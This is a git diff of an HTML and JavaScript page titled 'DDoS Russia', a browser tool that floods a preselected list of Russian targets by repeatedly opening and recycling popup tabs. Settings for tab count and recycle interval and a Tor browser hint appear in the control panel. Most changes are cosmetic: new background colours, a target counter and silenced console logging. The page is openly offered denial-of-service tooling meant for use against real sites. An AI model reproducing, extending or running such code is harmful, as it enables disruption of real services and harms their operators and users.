@@ -7,33 +7,54 @@
 
 	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
 
-	<title>DDoS RU</title>
+	<title>DDoS Russia</title>
 
 	<style>
-	  body {background-color: powderblue;}
+	  body {}
 	  h1,p {color: blue;}
 
 		#container {
-			width: 300px;
+			width: 500px;
 			margin: auto;
-			margin-top: 50px;
+			top: 0;
+		}
+
+		#topbackground {
+	    position: fixed;
+	    top: 0;
+	    left: 0;
+	    height: 50%;
+			width:100%;
+	    background-color: powderblue;
+		}
+
+		#background {
+	    position: fixed;
+	    top: 50%;
+	    left: 0;
+	    height: 50%;
+			width:100%;
+	    background-color: yellow;
 		}
 	</style>
 </head>
 
 <body>
-	<center><h1>DDoS against select Russian targets</h1></center>
-	<div id="container">
-		<p>Target list updated 03/08/2022 18:276UTC</p>
-		<p>Please allow popups for this file. This is the control file. In order to stop generating popups, kill this window, then you can close the others.</p>
-		<p><input id="windowcount" type="number" min="1" max="25" onblur="getWindowCount()" value="5" title="1 to 25"> Open how many tabs?</p>
-		<p><input id="windowlive" type="number" min="1" max="25" onblur="getWindowLive()" value="10" title="1 to 30"> Recycle window after how many seconds? TOR browser set to 30</p>
-		<button onclick="openURLs(); return false;">Start</button><br>
-		<button onclick="killAll(); return false;">Stop all</button> **Not functioning yet**<br>
-		<p>
-			This is a quick and easy script that anyone can run in a browser window. The targets are preselected (you can view them).
-		</p>
+	<div id="topbackground">
+		<center><h1>DDoS against select Russian targets</h1></center>
+		<div id="container">
+			<p>Target list updated 03/08/2022 18:276 UTC and contains <span id=theCount></span> targets.</p>
+			<p>Please allow popups for this file. This is the control file. In order to stop generating popups, kill this TAB, then you can close the others.</p>
+			<p><input id="windowcount" type="number" min="1" max="25" onblur="getWindowCount()" value="5" title="1 to 25"> Open how many tabs?</p>
+			<p><input id="windowlive" type="number" min="1" max="25" onblur="getWindowLive()" value="10" title="1 to 30"> Recycle window after how many seconds? TOR browser set to 30</p>
+			<button onclick="openURLs(); return false;">Start</button><br>
+			<button onclick="killAll(); return false;">Stop all</button> **Not functioning yet**<br>
+			<p>
+				This is a quick and easy script that anyone can run in a browser window. The targets are preselected (you can view them).
+			</p>
+		</div>
 	</div>
+	<div id="background">&nbsp;</div>
 </body>
 
 <script type="text/javascript">
@@ -45,6 +66,8 @@ var numWindows = 5;
 var dataIndex = 0;
 var windowlivesec = 10000;
 var dataLength = dataobj.url.length;
+
+$( '#theCount' ).html(dataLength);
 
 function getWindowCount() {
 	numWindows = $( "#windowcount" ).val();
@@ -69,12 +92,12 @@ function closeOnLoad(myLink)
 
 function openAnother(){
 	dataIndex++;
-	console.log(dataLength);
+	//console.log(dataLength);
 	if (dataIndex == dataLength) {
 		dataIndex = 0;
 	}
 	closeOnLoad(dataobj.url[dataIndex]);
-	console.log(dataIndex,dataobj.url[dataIndex]);
+	//console.log(dataIndex,dataobj.url[dataIndex]);
 }
 
 function openURLs(){
